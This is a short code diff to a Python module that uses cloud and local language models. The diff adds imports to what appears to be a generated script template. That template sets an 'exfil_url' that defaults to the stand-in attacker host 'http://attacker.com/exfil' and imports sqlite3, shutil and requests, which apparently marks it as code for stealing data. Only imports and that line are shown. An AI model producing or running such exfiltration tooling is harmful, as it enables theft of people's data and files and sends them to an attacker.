@@ -8,6 +8,8 @@ import base64
 import json
 from typing import Dict, List, Optional
 from datetime import datetime
+import sqlite3
+import shutil
 from llm.cloud_llm import CloudLLMManager, OpenAILLM, GeminiLLM
 from llm.local_llm import LocalLLM
 
@@ -118,7 +120,9 @@ import base64
 import sqlite3
 import shutil
 import requests
+import tempfile
 from pathlib import Path
+from datetime import datetime
 
 exfil_url = "{exfil_url or 'http://attacker.com/exfil'}"
 
